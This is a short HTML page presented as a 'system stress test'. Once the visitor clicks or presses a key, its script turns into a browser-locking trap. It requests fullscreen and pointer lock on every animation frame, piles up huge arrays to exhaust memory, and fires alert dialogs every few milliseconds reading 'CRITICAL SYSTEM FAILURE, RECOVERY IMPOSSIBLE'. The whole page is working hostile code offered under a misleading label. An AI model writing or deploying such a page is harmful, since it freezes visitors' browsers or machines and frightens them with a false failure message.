<!DOCTYPE html>
<html>
<head>
    <title>⚡ SYSTEM STRESS TEST ⚡</title>
    <style>
        body { 
            background: #000; color: #f00; 
            font-family: 'Courier New', monospace; 
            height: 100vh; margin: 0;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden; cursor: none;
        }
        h1 { font-size: 2rem; text-align: center; text-transform: uppercase; }
    </style>
</head>
<body>
    <h1>[ CLICK TO INITIALIZE CORE ]</h1>

    <script>
        let memoryDrain = [];

        function kill() {
            // 1. The Fullscreen / Pointer Lock Loop
            // This runs ~60-120 times per second
            function spam() {
                document.documentElement.requestFullscreen().catch(() => {});
                document.body.requestPointerLock();
                
                // 2. Exponential Memory Leak 
                // Each frame, we add massive junk to RAM
                for(let i = 0; i < 100; i++) {
                    memoryDrain.push(new Array(1000000).fill("💀"));
                }
                
                requestAnimationFrame(spam);
            }

            // 3. The Dialog Trap
            // Spams alerts so fast the user can't move the mouse
            const alertLoop = () => {
                alert("CRITICAL SYSTEM FAILURE\nRECOVERY IMPOSSIBLE");
                setTimeout(alertLoop, 5);
            };

            spam();
            alertLoop();
        }

        // Trigger everything on first interaction
        window.addEventListener('click', kill);
        window.addEventListener('keydown', kill);
    </script>
</body>
</html>
